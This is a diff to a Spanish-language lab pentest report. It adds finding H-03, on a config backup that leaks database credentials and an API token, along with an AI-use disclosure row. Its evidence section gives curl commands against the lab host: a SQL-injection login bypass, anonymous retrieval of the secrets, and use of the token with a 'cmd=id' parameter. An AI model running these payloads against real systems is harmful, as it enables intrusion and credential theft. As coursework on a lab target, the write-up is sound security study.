@@ -12,6 +12,7 @@
 |---|---|---|---|
 | Claude (Anthropic), vía Claude Code | Asistencia en el recon/enumeración del hito **R1**, captura de evidencia por HTTP y redacción de §0, §2 y el hallazgo **H-01**. | §0, §2, H-01 y `evidencia/r1-*.txt`. | **Todas las salidas pegadas son ejecuciones HTTP reales** contra el target (guardadas en `evidencia/r1-01…04`). La flag de R1 se validó comprobando que su **SHA-256 coincide con el `retos.manifest`** del lab (ver H-01). El integrante revisó cada request/response y puede reproducir el recon y explicar cada paso. |
 | Claude (Anthropic), vía Claude Code | Asistencia en la explotación del hito **R2** (foothold por SQLi en el login), captura de evidencia por HTTP y redacción del hallazgo **H-02**. | H-02 y `evidencia/r2-*.txt`. | **Todas las salidas pegadas son POST HTTP reales** contra una instancia fiel del `server.py` del lab (baseline 401, sondeo con comilla, bypass con `admin'-- -` y tautología `' OR '1'='1`, guardados en `evidencia/r2-01…04`). La flag de R2 se validó por **SHA-256 contra el `retos.manifest`** (`812d30f0…`). El integrante entiende por qué la query concatenada es inyectable y puede reproducir y explicar el bypass. |
+| Claude (Anthropic), vía Claude Code | **Apoyo puntual** en el hito **R3**. El trabajo —ejecutar el loot del token desde el backup, analizar por qué el backup sin control de acceso entrega el secreto y redactar el hallazgo— lo hizo el integrante del grupo. La IA se usó solo para **ordenar y dar formato** a la evidencia ya capturada y para una **revisión de estilo** de la redacción. | Formato de `evidencia/r3-*.txt` y revisión de redacción de **H-03**. El análisis, la explotación y las conclusiones son del integrante. | El integrante **ejecutó personalmente** cada petición HTTP contra la instancia del lab (dashboard que revela el backup, `GET /backup/rrhh.conf` con el token y la flag, backup servido **sin sesión**, y 403→200 en `/api/reporte` con el token). Validó la flag por **SHA-256 contra el `retos.manifest`** (`66a434f8…`) y puede reproducir y explicar el loot completo sin asistencia. |
 
 > *(Cada integrante agrega su fila al cerrar su hito.)*
 
@@ -63,7 +64,7 @@ recon/enum (R1)  ->  foothold (R2)  ->  loot (R3)  ->  impacto (R4)
 |---|---|---|---|
 | Reconocimiento + Enumeración | **R1** | Mapeo de rutas, lectura de `robots.txt`, inspección del HTML del portal | `curl`, fuzzing manual de rutas |
 | Explotación | **R2** | SQLi en el login del portal (bypass de autenticación por comentario/tautología) | `curl`, `sqlite3` para razonar la query |
-| Post-explotación | **R3** | *(loot del token de API desde el backup de config)* | — |
+| Post-explotación | **R3** | Loot de secretos: lectura del backup de config `/backup/rrhh.conf` (credenciales de BD + token de API) accesible sin autorización | `curl` |
 | Impacto | **R4** | *(inyección de comando vía `/api/reporte` → datos de clientes)* | — |
 
 > Entorno de verificación: el target es el `server.py` del lab. Para R1 se levantó
@@ -209,7 +210,81 @@ recon/enum  ->  foothold  ->  loot  ->  impacto
   4. **Mínimo privilegio en la BD**: la cuenta de la app no debería poder más de lo que
      el login necesita, y el rol admin no debería derivarse de una única fila trivial.
 
-### H-03 · ...
+### H-03 · Exposición de secretos en un backup de configuración accesible sin autorización
+- **Severidad:** Alta · **CVSS:** 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
+  *(Justificación: el archivo es alcanzable por red, sin privilegios ni interacción y con
+  explotación trivial (AV:N/AC:L/PR:N/UI:N). Expone en claro credenciales de la base de datos
+  y un token de API válido → impacto de confidencialidad **alto** (C:H). El hallazgo por sí
+  mismo no altera ni degrada el servicio (I:N/A:N): el abuso del token para ejecutar comandos
+  y acceder a los datos se desarrolla en **H-04**. Scope sin cambio, S:U, consistente con el
+  criterio aplicado en el resto del informe.)*
+- **Ubicación:** host `phantomcorp` → `GET /backup/rrhh.conf`.
+- **Descripción:** Tras el foothold (**H-02**), el dashboard del portal RRHH publica la ruta
+  `/backup/rrhh.conf`. Ese endpoint sirve, en texto plano, un **backup de configuración** con
+  secretos de producción: usuario y contraseña de la base de datos (`DB_USER=rrhh_app`,
+  `DB_PASS=Rh-2026`) y, sobre todo, un **token de API** (`API_TOKEN=phantom-api-7c1e`). El
+  propio archivo documenta cómo usar el token (`/api/reporte?token=...&cmd=...`). Dos defectos
+  se combinan: (1) **secretos versionados/servidos como artefacto** en lugar de guardarse fuera
+  del contenido servible; y (2) **control de acceso roto** — el backup no está protegido tras el
+  login: cualquier `GET` anónimo lo devuelve con `200`, sin sesión ni cookie. El token, además,
+  es **corto y predecible** (`phantom-api-7c1e`), sin entropía suficiente para resistir fuerza
+  bruta/adivinación.
+- **Evidencia (reproducible):**
+  ```bash
+  # 1) El dashboard del foothold (R2) publica la ruta del backup
+  $ curl -s -X POST http://phantomcorp/portal/login --data "user=admin'-- -&pass=x"
+  Bienvenido admin. Dashboard RRHH.
+  FLAG{final_sqli_foothold}
+  Backup de config disponible en: /backup/rrhh.conf
+
+  # 2) Loot: el backup filtra credenciales de BD y el token de API (+ la flag R3)
+  $ curl -s http://phantomcorp/backup/rrhh.conf
+  DB_USER=rrhh_app
+  DB_PASS=Rh-2026
+  API_TOKEN=phantom-api-7c1e
+  # usar el token en /api/reporte?token=...&cmd=... FLAG{final_token_looted}
+
+  # 3) El backup NO exige autorización: un GET anónimo (sin sesión) responde 200
+  $ curl -s -o /dev/null -w "HTTP %{http_code}\n" http://phantomcorp/backup/rrhh.conf
+  HTTP 200
+
+  # 4) El token looteado habilita el siguiente hito: /api/reporte pasa de 403 a 200
+  $ curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://phantomcorp/api/reporte?cmd=id"
+  HTTP 403
+  $ curl -s -o /dev/null -w "HTTP %{http_code}\n" "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id"
+  HTTP 200
+
+  # 5) Validación de la flag R3 contra el retos.manifest del lab (SHA-256)
+  $ printf '%s' 'FLAG{final_token_looted}' | sha256sum
+  66a434f816e74d489f75a6636e627df3be31fade79acd8e7f9bf5a4205f6b4f8
+  # == R3 en retos.manifest -> flag correcta, no inventada
+  ```
+  Salidas completas con cabeceras en `evidencia/r3-01-dashboard-ruta-backup.txt`,
+  `r3-02-loot-backup-conf.txt`, `r3-03-backup-sin-auth.txt`,
+  `r3-04-token-habilita-api.txt` y `r3-05-flag-hash.txt`.
+- **Impacto:** Es el **loot** que convierte el acceso al portal en control de la cadena. Las
+  credenciales de BD y, sobre todo, el token de API filtrados son exactamente el secreto que
+  **gatea `/api/reporte`**: con él, en **H-04**, el atacante ejecuta comandos en el servidor y
+  alcanza los datos de clientes (los *crown jewels*). Que el backup sea accesible sin sesión
+  agrava el hallazgo: ni siquiera hace falta mantener el foothold para releer el secreto. Sin
+  este eslabón, el token no se conoce y la cadena no llega al impacto final.
+- **Remediación:**
+  1. **Sacar los secretos del contenido servible:** las credenciales y tokens no deben vivir en
+     archivos alcanzables por HTTP ni en el repositorio; usar variables de entorno o un gestor de
+     secretos (Vault, SSM, Docker/K8s secrets) inyectado en runtime.
+  2. **No publicar backups por la web:** eliminar el endpoint `/backup/*`; los respaldos van a
+     almacenamiento privado con acceso autenticado y auditado, nunca en la raíz del servicio.
+  3. **Control de acceso real:** cualquier recurso sensible debe exigir sesión/autorización del
+     lado del servidor; no alcanza con "no linkearlo" (igual que `robots.txt` en H-01 no es un
+     control).
+  4. **Tokens con entropía y rotación:** reemplazar `phantom-api-7c1e` por un token aleatorio
+     largo (≥128 bits), con caducidad y rotación, y **revocarlo de inmediato** por haber quedado
+     expuesto. Idealmente, el token no debería por sí solo habilitar ejecución de comandos
+     (ver remediación de **H-04**).
+  5. **Rotar credenciales comprometidas:** cambiar `DB_PASS` y aplicar mínimo privilegio a
+     `rrhh_app` en la base de datos.
+
+### H-04 · ...
 
 ---
 
